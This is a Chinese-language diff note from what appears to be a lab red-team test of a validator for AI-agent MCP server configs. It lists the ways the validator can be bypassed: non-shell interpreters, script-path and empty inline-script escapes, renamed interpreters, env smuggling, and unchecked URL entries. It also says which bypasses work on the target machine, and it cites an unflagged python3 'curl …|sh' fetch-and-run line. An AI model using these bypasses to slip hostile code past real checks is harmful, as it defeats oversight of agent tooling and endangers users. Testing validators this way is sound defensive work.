@@ -1,0 +1,54 @@
+【本轮无 agent 参与 —— 这是设计选择】
+
+M11-r2 验证的是「校验器」，不是「agent」。
+校验器是一个独立纯函数 validate_mcp_server_entry(name, entry) -> list[str]，
+agenttest 以只读方式导入靶机源码即可直接调用，无需写 config、无需跑 agent、无需改任何靶机状态。
+
+因此本轮证据是确定的、可复现的、零污染的：
+    输入 → 真校验器 → 返回值
+
+没有"agent 是否读文件"这个变量，因为对象不是它。
+
+────────────────────────────────
+盲区归类（这份差分的用处）
+
+  非 shell 解释器完全免检
+      python3 / node / /usr/bin/python3 / perl / ruby …
+      _command_basename 不在 _SHELL_INTERPRETERS -> 早返回，
+      egress/persistence 两个正则一次都不跑
+
+  脚本路径逃逸
+      bash /tmp/evil.sh —— 检查对象是 args 文本本身，args 只有一个路径
+      -> 两个正则都不匹配 -> 放行。脚本内容从不被读
+
+  空 inline 脚本逃逸
+      sh -c（-c 后面没东西）-> _inline_script 拼出空串 -> if not script: return
+
+  远程包拉取
+      npx -y <pkg> / uvx --from <url> <name>
+      配置里只有包名/URL，恶意代码运行期才落地，审查时磁盘上什么都没有
+
+  env 走私
+      env 值确实进了 _entry_text，但只跟 5 个 IOC 比
+
+  URL 型条目零检查
+      _entry_text 对 url 型返回 ' '
+
+  basename 判定可绕
+      _command_basename 取的是文件名字符串，不是解析后的真实解释器
+      任何被改名或软链成非 shell 名字的解释器都会跳过后两个检查
+
+────────────────────────────────
+靶机运行时实况（决定可落地性）
+
+  python3 -> /usr/bin/python3  (Python 3.12.3)
+  python / uv / uvx / pipx / node / npx / npm / bun / deno -> 全部不存在
+
+  可落地: 非 shell 解释器免检、bash 脚本路径逃逸、env 走私、URL 型零检查、改名绕过
+  不可落地: npx / uvx 远程包（运行时缺失，属理论盲区）
+
+────────────────────────────────
+这条正是「验证静态扫描器识别不到我们的恶意」的直接证据
+
+  平台自己指定的安全校验点，对 python3 一行 os.system('curl …|sh')
+  返回空列表，一个字都不提。
